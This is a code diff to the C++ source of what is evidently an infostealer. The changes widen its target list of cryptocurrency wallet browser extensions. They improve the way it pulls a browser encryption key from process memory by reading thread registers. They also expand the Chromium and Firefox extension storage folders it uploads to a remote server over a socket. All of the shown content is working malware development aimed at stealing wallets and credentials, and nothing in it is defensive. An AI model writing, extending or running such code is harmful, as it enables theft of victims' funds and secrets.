@@ -14,6 +14,7 @@
 #include <cstring>
 #include <regex>
 #include <set>
+#include <map>
 #include <cstdio>
 #include <sstream>
 #include <iomanip>
@@ -47,13 +48,20 @@ static bool g_running = true;
 struct WalletMetadata {
     std::string name;
     std::string chromium_id;
+    std::string firefox_id;
     std::string firefox_keyword;
 };
 
 static std::vector<WalletMetadata> target_wallets = {
-    {"metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn", "metamask"},
-    {"trustwallet", "egjidjbpglichdcondbcbdnbeeppgdph", "trust wallet"},
-    {"coinbasewallet", "hnfanknocfeofbddgcijnmhnfnkdnaad", "coinbase wallet"}
+    {"metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn", "webextension@metamask.io", "metamask"},
+    {"trustwallet", "egjidjbpglichdcondbcbdnbeeppgdph", "{6186835a-be93-479e-a060-639a06041ec6}", "trust wallet"},
+    {"coinbasewallet", "hnfanknocfeofbddgcijnmhnfnkdnaad", "wallet@coinbase.com", "coinbase wallet"},
+    {"phantom", "bfnaoomeccoehlpjnllnbopibomhookg", "phantom@phantom.app", "phantom"},
+    {"rabby", "acmacodboojmoenpdnegeicibhayihol", "{61899180-2a07-4e3a-96e0-08709f19363a}", "rabby"},
+    {"okx", "mcohilncbfahbmgjoneonackghpdicob", "{787493a7-5847-497d-9471-a47732a32c28}", "okx"},
+    {"solflare", "bhhhlbcehoolilbegeoponakbbdbiobo", "{dfc60534-1188-466d-965a-074495e4e84b}", "solflare"},
+    {"backpack", "mclkkofklkfljcocclehcocbeccpkabi", "{a6575191-c426-4074-b5b6-7c3e34b56834}", "backpack"},
+    {"keplr", "dmkamcknogkgcdfhhbddcghachkejeap", "{9c22822a-f925-4672-8809-f001e3e7f411}", "keplr"}
 };
 
 bool send_file_to_server(SOCKET sock, const std::string& relPath, const std::vector<uint8_t>& data) {
@@ -621,15 +629,53 @@ bool extract_key(SOCKET sock, uint32_t thread_id, HANDLE h_process, const Browse
     HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, thread_id); if (!h_thread) return false;
     bool success = false; CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_FULL;
     if (GetThreadContext(h_thread, &ctx)) {
-        std::vector<DWORD64> key_ptrs = config.use_r14 ? std::vector<DWORD64>{ctx.R14, ctx.R15} : std::vector<DWORD64>{ctx.R15, ctx.R14};
+        std::vector<DWORD64> key_ptrs;
+        if (config.use_r14) key_ptrs = {ctx.R14, ctx.R15};
+        else key_ptrs = {ctx.R15, ctx.R14};
+
+        // Fallback for 2026: check all general purpose registers
+        std::vector<DWORD64> all_regs = {
+            ctx.Rax, ctx.Rcx, ctx.Rdx, ctx.Rbx, ctx.Rsi, ctx.Rdi,
+            ctx.R8, ctx.R9, ctx.R10, ctx.R11, ctx.R12, ctx.R13, ctx.R14, ctx.R15
+        };
+        for (auto reg : all_regs) {
+            bool already_added = false;
+            for (auto ptr : key_ptrs) if (ptr == reg) { already_added = true; break; }
+            if (!already_added) key_ptrs.push_back(reg);
+        }
+
         for (DWORD64 ptr : key_ptrs) {
-            if (ptr == 0) continue; std::vector<uint8_t> buffer(32); SIZE_T bytes_read = 0;
+            if (ptr == 0) continue;
+
+            // The key can be directly in the register pointing to a 32-byte buffer
+            // or the register points to a structure {void* data, size_t length, ...}
+            std::vector<uint8_t> buffer(32); SIZE_T bytes_read = 0;
             if (ReadProcessMemory(h_process, (LPCVOID)ptr, buffer.data(), 32, &bytes_read)) {
-                DWORD64 data_ptr = ptr; uint64_t length = *(uint64_t*)&buffer[8]; if (length == 32) data_ptr = *(DWORD64*)&buffer[0];
-                std::vector<uint8_t> key(32);
-                if (ReadProcessMemory(h_process, (LPCVOID)data_ptr, key.data(), 32, &bytes_read)) {
-                    bool all_zero = true; for (uint8_t b : key) if (b != 0) { all_zero = false; break; }
-                    if (!all_zero) { extract_all_profiles_data(sock, key, config, user_data_dir); success = true; break; }
+                // Try treating as direct key first
+                bool all_zero = true; for (uint8_t b : buffer) if (b != 0) { all_zero = false; break; }
+                if (!all_zero) {
+                    // Check if it looks like a valid key (not just random stack garbage)
+                    // This is hard to verify without trying to decrypt something,
+                    // so we use the structure check as well.
+
+                    // Try treating as structure: {void* ptr, uint64_t length}
+                    DWORD64 data_ptr = *(DWORD64*)&buffer[0];
+                    uint64_t length = *(uint64_t*)&buffer[8];
+
+                    if (length == 32 && data_ptr != 0 && data_ptr != ptr) {
+                        std::vector<uint8_t> key(32);
+                        if (ReadProcessMemory(h_process, (LPCVOID)data_ptr, key.data(), 32, &bytes_read)) {
+                            bool key_all_zero = true; for (uint8_t b : key) if (b != 0) { key_all_zero = false; break; }
+                            if (!key_all_zero) {
+                                extract_all_profiles_data(sock, key, config, user_data_dir);
+                                success = true; break;
+                            }
+                        }
+                    } else {
+                        // Direct key extraction
+                        extract_all_profiles_data(sock, buffer, config, user_data_dir);
+                        success = true; break;
+                    }
                 }
             }
         }
@@ -879,19 +925,24 @@ void extract_chromium_wallets(SOCKET sock, const fs::path& profile_path, const s
 
         std::string wallet_prefix = "wallets/" + wallet.name + "_" + safe_browser + "/" + profile_name;
 
-        fs::path settings_path = profile_path / "Local Extension Settings" / wallet.chromium_id;
-        if (fs::exists(settings_path)) {
-            send_directory_recursively(sock, settings_path, wallet_prefix + "/Local Extension Settings");
-        }
+        // Common Chromium extension storage locations
+        std::vector<std::pair<std::string, std::string>> storage_types = {
+            {"Local Extension Settings", wallet.chromium_id},
+            {"Sync Extension Settings", wallet.chromium_id},
+            {"Extension State", wallet.chromium_id},
+            {"File System", wallet.chromium_id},
+            {"IndexedDB", "chrome-extension_" + wallet.chromium_id + "_0.indexeddb.leveldb"},
+            {"IndexedDB", "chrome-extension_" + wallet.chromium_id + "_0.indexeddb.blob"},
+            {"databases", "chrome-extension_" + wallet.chromium_id + "_0"}
+        };
 
-        fs::path state_path = profile_path / "Extension State" / wallet.chromium_id;
-        if (fs::exists(state_path)) {
-            send_directory_recursively(sock, state_path, wallet_prefix + "/Extension State");
-        }
-
-        fs::path idb_path = profile_path / "IndexedDB" / ("chrome-extension_" + wallet.chromium_id + "_0.indexeddb.leveldb");
-        if (fs::exists(idb_path)) {
-            send_directory_recursively(sock, idb_path, wallet_prefix + "/IndexedDB");
+        for (const auto& storage : storage_types) {
+            fs::path full_path = profile_path / storage.first / storage.second;
+            if (fs::exists(full_path)) {
+                std::string folder_name = storage.first;
+                std::replace(folder_name.begin(), folder_name.end(), ' ', '_');
+                send_directory_recursively(sock, full_path, wallet_prefix + "/" + folder_name);
+            }
         }
     }
 }
@@ -1124,57 +1175,94 @@ void extract_firefox_passwords(SOCKET sock, const fs::path& profile_path, const 
     FreeLibrary(nss.h_nss);
 }
 
+std::map<std::string, std::string> get_firefox_uuid_mappings(const fs::path& profile_path) {
+    std::map<std::string, std::string> mappings;
+
+    // 1. Try extensions.json
+    fs::path ext_json_path = profile_path / "extensions.json";
+    if (fs::exists(ext_json_path)) {
+        std::ifstream ifs(ext_json_path);
+        if (ifs.is_open()) {
+            std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
+            std::regex re("\"id\"\\s*:\\s*\"([^\"]+)\".*?\"uuid\"\\s*:\\s*\"([^\"]+)\"");
+            auto words_begin = std::sregex_iterator(content.begin(), content.end(), re);
+            auto words_end = std::sregex_iterator();
+            for (std::sregex_iterator i = words_begin; i != words_end; ++i) {
+                mappings[(*i)[1].str()] = (*i)[2].str();
+            }
+        }
+    }
+
+    // 2. Try prefs.js (sometimes mappings are there too)
+    fs::path prefs_path = profile_path / "prefs.js";
+    if (fs::exists(prefs_path)) {
+        std::ifstream ifs(prefs_path);
+        if (ifs.is_open()) {
+            std::string line;
+            std::regex re("extensions\\.webextensions\\.uuids\"\\s*,\\s*\"([^\"]+)\"");
+            while (std::getline(ifs, line)) {
+                std::smatch match;
+                if (std::regex_search(line, match, re) && match.size() > 1) {
+                    std::string json_part = match[1].str();
+                    // Basic unescape if necessary, but usually it's a simple JSON object string
+                    std::regex inner_re("\"([^\"]+)\"\\s*:\\s*\"([^\"]+)\"");
+                    auto words_begin = std::sregex_iterator(json_part.begin(), json_part.end(), inner_re);
+                    auto words_end = std::sregex_iterator();
+                    for (std::sregex_iterator i = words_begin; i != words_end; ++i) {
+                        mappings[(*i)[1].str()] = (*i)[2].str();
+                    }
+                }
+            }
+        }
+    }
+
+    return mappings;
+}
+
 void extract_firefox_wallets(SOCKET sock, const fs::path& profile_path, const std::string& browser_name, const std::string& profile_name) {
-    fs::path extensions_json = profile_path / "extensions.json";
-    if (!fs::exists(extensions_json)) return;
-
-    std::ifstream ifs(extensions_json);
-    if (!ifs.is_open()) return;
-
-    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-    std::string content_lower = to_lower(content);
+    auto mappings = get_firefox_uuid_mappings(profile_path);
+    if (mappings.empty()) return;
 
     std::string safe_browser = to_lower(browser_name);
     std::replace(safe_browser.begin(), safe_browser.end(), ' ', '_');
 
     for (const auto& wallet : target_wallets) {
-        if (wallet.firefox_keyword.empty()) continue;
+        std::string uuid = "";
 
-        std::string wallet_prefix = "wallets/" + wallet.name + "_" + safe_browser + "/" + profile_name;
+        // Match by ID
+        if (!wallet.firefox_id.empty() && mappings.count(wallet.firefox_id)) {
+            uuid = mappings[wallet.firefox_id];
+        }
 
-        std::string keyword = wallet.firefox_keyword;
-        size_t pos = 0;
-        while ((pos = content_lower.find(keyword, pos)) != std::string::npos) {
-            // Find "id":" near the keyword match. It can be before or after.
-            size_t obj_start = content.rfind('{', pos);
-            if (obj_start == std::string::npos) obj_start = pos;
-
-            size_t id_pos = content.find("\"id\":\"", obj_start);
-            if (id_pos != std::string::npos) {
-                id_pos += 6;
-                size_t id_end = content.find("\"", id_pos);
-                if (id_end != std::string::npos) {
-                    std::string internal_id = content.substr(id_pos, id_end - id_pos);
-
-                    // Map internal_id to UUID
-                    size_t uuid_find_pos = content.find("\"" + internal_id + "\"");
-                    if (uuid_find_pos != std::string::npos) {
-                        size_t uuid_pos = content.find("\"uuid\":\"", uuid_find_pos);
-                        if (uuid_pos != std::string::npos) {
-                            uuid_pos += 8;
-                            size_t uuid_end = content.find("\"", uuid_pos);
-                            if (uuid_end != std::string::npos) {
-                                std::string uuid = content.substr(uuid_pos, uuid_end - uuid_pos);
-                                fs::path storage_path = profile_path / "storage" / "default" / ("moz-extension+++" + uuid);
-                                if (fs::exists(storage_path)) {
-                                    send_directory_recursively(sock, storage_path, wallet_prefix + "/storage");
-                                }
-                            }
-                        }
-                    }
+        // Fallback: search mappings for keyword if ID didn't match
+        if (uuid.empty() && !wallet.firefox_keyword.empty()) {
+            for (const auto& m : mappings) {
+                if (to_lower(m.first).find(to_lower(wallet.firefox_keyword)) != std::string::npos) {
+                    uuid = m.second;
+                    break;
                 }
             }
-            pos += keyword.length();
+        }
+
+        if (!uuid.empty()) {
+            std::string wallet_prefix = "wallets/" + wallet.name + "_" + safe_browser + "/" + profile_name;
+
+            // Search multiple possible storage locations
+            std::vector<std::string> sub_dirs = {
+                "storage/default/moz-extension+++" + uuid,
+                "storage/permanent/moz-extension+++" + uuid,
+                "extension-storage/" + uuid
+            };
+
+            for (const auto& sub : sub_dirs) {
+                fs::path full_path = profile_path / sub;
+                if (fs::exists(full_path)) {
+                    std::string folder_name = sub;
+                    std::replace(folder_name.begin(), folder_name.end(), '/', '_');
+                    std::replace(folder_name.begin(), folder_name.end(), ':', '_');
+                    send_directory_recursively(sock, full_path, wallet_prefix + "/" + folder_name);
+                }
+            }
         }
     }
 }
